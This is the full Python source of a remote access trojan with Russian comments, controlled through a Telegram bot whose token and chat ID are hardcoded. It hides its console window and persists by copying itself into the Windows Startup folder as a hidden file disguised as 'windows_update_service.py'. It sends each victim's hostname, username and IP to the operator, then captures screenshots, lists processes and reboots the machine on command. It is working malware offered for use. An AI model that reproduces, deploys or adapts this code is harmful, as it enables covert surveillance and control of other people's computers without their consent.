import os
import platform
import requests
import subprocess
import time
import shutil
import socket
import sys
import json

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

BOT_TOKEN = "8317387634:AAHexPFi5rjtIZMDztq2oOnPp9z8Chl4sn0"
CHAT_ID = "-1003442349627"

# Храним информацию о всех жертвах
victims = {}

class RealRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.victim_id = socket.gethostname()
        self.last_update_id = 0
        
        # Регистрируем жертву
        victims[self.victim_id] = {
            'username': os.getlogin(),
            'online': True,
            'last_seen': time.time()
        }
        
    def hide_console(self):
        try:
            if platform.system().startswith("Windows"):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def setup_persistence(self):
        try:
            if platform.system().startswith("Windows"):
                appdata = os.getenv('APPDATA')
                startup_dir = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                script_path = os.path.abspath(__file__)
                target_path = os.path.join(startup_dir, 'windows_update_service.py')
                
                if not os.path.exists(target_path):
                    shutil.copy2(script_path, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
                    
        except Exception as e:
            pass

    def send_to_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                'chat_id': self.chat_id,
                'text': text
            }
            requests.get(url, params=params, timeout=10)
        except:
            pass

    def send_file_to_telegram(self, filename):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(filename, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}
                requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

    def send_main_keyboard(self):
        """Основная клавиатура управления"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            keyboard = {
                'keyboard': [
                    [{'text': '📸 Скриншот'}, {'text': '💻 Информация'}],
                    [{'text': '🌐 IP адрес'}, {'text': '📊 Процессы'}],
                    [{'text': '🔄 Перезагрузить'}, {'text': '🗑️ Удалить RAT'}],
                    [{'text': '🖥️ Сменить ПК'}]  # Новая кнопка для смены ПК
                ],
                'resize_keyboard': True,
                'one_time_keyboard': False
            }
            params = {
                'chat_id': self.chat_id,
                'text': f'🎯 Управление: {self.victim_id}\nПользователь: {os.getlogin()}\nВыберите действие:',
                'reply_markup': keyboard
            }
            requests.post(url, json=params, timeout=10)
        except:
            pass

    def send_pc_selection_keyboard(self):
        """Клавиатура выбора ПК"""
        try:
            # Обновляем статус онлайн
            victims[self.victim_id]['online'] = True
            victims[self.victim_id]['last_seen'] = time.time()
            
            # Создаем кнопки для каждого ПК
            pc_buttons = []
            for pc_id, pc_info in victims.items():
                status = "🟢" if pc_info['online'] else "🔴"
                button_text = f"{status} {pc_id}"
                pc_buttons.append([{'text': button_text}])
            
            # Добавляем кнопку назад
            pc_buttons.append([{'text': '⬅️ Назад'}])
            
            keyboard = {
                'keyboard': pc_buttons,
                'resize_keyboard': True,
                'one_time_keyboard': False
            }
            
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                'chat_id': self.chat_id,
                'text': '🖥️ Выберите компьютер для управления:',
                'reply_markup': keyboard
            }
            requests.post(url, json=params, timeout=10)
        except:
            pass

    def collect_system_info(self):
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
            
            info = f"""💻 ИНФОРМАЦИЯ О СИСТЕМЕ:

🖥️ Компьютер: {self.victim_id}
👤 Пользователь: {os.getlogin()}
🌐 IP адрес: {ip}
⚙️ Система: {platform.system()} {platform.release()}
📁 Директория: {os.getcwd()}"""
            
            return info
        except:
            return f"💻 Базовая информация:\nКомпьютер: {self.victim_id}\nПользователь: {os.getlogin()}"

    def take_screenshot(self):
        try:
            file_path = "screen.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            self.send_file_to_telegram(file_path)
            os.remove(file_path)
            return True
        except:
            return False

    def get_processes(self):
        try:
            if platform.system().startswith("Windows"):
                result = subprocess.check_output('tasklist', shell=True, stderr=subprocess.STDOUT)
            else:
                result = subprocess.check_output('ps aux', shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore').strip()[:3000]
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def uninstall_rat(self):
        """Удаляем RAT"""
        try:
            if platform.system().startswith("Windows"):
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                rat_path = os.path.join(startup_dir, 'windows_update_service.py')
                if os.path.exists(rat_path):
                    os.remove(rat_path)
            
            # Удаляем из списка жертв
            if self.victim_id in victims:
                del victims[self.victim_id]
                
            return True
        except:
            return False

    def execute_command(self, command):
        try:
            if command == '📸 Скриншот':
                self.take_screenshot()
                return "📸 Скриншот отправлен!"
                
            elif command == '💻 Информация':
                return self.collect_system_info()
                
            elif command == '🌐 IP адрес':
                ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
                return f"🌐 IP адрес: {ip}"
                
            elif command == '📊 Процессы':
                processes = self.get_processes()
                return f"📊 Запущенные процессы:\n{processes}"
                
            elif command == '🔄 Перезагрузить':
                if platform.system().startswith("Windows"):
                    os.system('shutdown /r /t 30')
                    return "🔄 Перезагрузка через 30 секунд!"
                else:
                    os.system('shutdown -r +1')
                    return "🔄 Перезагрузка через 1 минуту!"
                    
            elif command == '🗑️ Удалить RAT':
                if self.uninstall_rat():
                    return "🗑️ RAT удалена из автозагрузки! Завершение работы..."
                else:
                    return "❌ Ошибка удаления RAT"
                    
            else:
                return "❌ Неизвестная команда"
                
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def check_commands(self):
        """Проверяем команды от бота"""
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            params = {'offset': self.last_update_id + 1, 'timeout': 10}
            response = requests.get(url, params=params, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    for update in data['result']:
                        update_id = update['update_id']
                        
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        
                        if 'message' in update and 'text' in update['message']:
                            message_text = update['message']['text']
                            
                            # Команда смены ПК
                            if message_text in ['/change', '🖥️ Сменить ПК']:
                                self.send_pc_selection_keyboard()
                                continue
                            
                            # Кнопка Назад
                            if message_text == '⬅️ Назад':
                                self.send_main_keyboard()
                                continue
                            
                            # Выбор конкретного ПК (начинается с 🟢 или 🔴)
                            if message_text.startswith('🟢 ') or message_text.startswith('🔴 '):
                                selected_pc = message_text[2:]  # Убираем эмодзи
                                if selected_pc in victims:
                                    # Пока просто уведомляем о выборе
                                    self.send_to_telegram(f"🎯 Выбран компьютер: {selected_pc}\nУправление через основное меню")
                                    self.send_main_keyboard()
                                continue
                            
                            # Основные команды управления
                            if message_text in ['📸 Скриншот', '💻 Информация', '🌐 IP адрес', '📊 Процессы', 
                                              '🔄 Перезагрузить', '🗑️ Удалить RAT']:
                                result = self.execute_command(message_text)
                                self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
                                
                                if message_text == '🗑️ Удалить RAT':
                                    time.sleep(2)
                                    sys.exit(0)
                            
        except Exception as e:
            print(f"Ошибка проверки команд: {e}")

    def start(self):
        self.hide_console()
        self.setup_persistence()
        
        # Отправляем уведомление о подключении
        time.sleep(5)
        system_info = self.collect_system_info()
        self.send_to_telegram(system_info)
        
        # Отправляем основную клавиатуру
        time.sleep(2)
        self.send_main_keyboard()
        
        # Основной цикл
        while True:
            try:
                self.check_commands()
                time.sleep(3)
            except Exception as e:
                time.sleep(10)

if __name__ == '__main__':
    rat = RealRAT()
    rat.start()
